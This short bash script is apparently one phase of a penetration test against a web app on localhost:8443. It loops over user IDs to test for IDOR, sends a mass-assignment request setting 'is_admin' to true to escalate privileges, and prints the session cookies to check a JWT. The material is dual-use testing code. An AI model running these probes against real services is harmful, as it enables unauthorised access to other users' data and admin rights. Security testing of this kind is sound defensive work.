#!/bin/bash
echo "=== PHASE 5: PRIVILEGE ESCALATION ==="

# Test 1: IDOR (Insecure Direct Object Reference)
echo "\n1️⃣ Testing IDOR - Access other users..."
for userid in 1 2 3 4 5; do
  curl -k -X GET https://localhost:8443/api/user/$userid \
    -b cookies.txt | jq .
done

# Test 2: Mass Assignment
echo "\n2️⃣ Testing Mass Assignment - Try to become admin..."
curl -k -X PUT https://localhost:8443/api/user/profile \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "display_name": "attacker",
    "is_admin": true,
    "role": "admin"
  }' | jq .

# Test 3: JWT Manipulation (wenn JWT verwendet wird)
echo "\n3️⃣ Check JWT token..."
cat cookies.txt

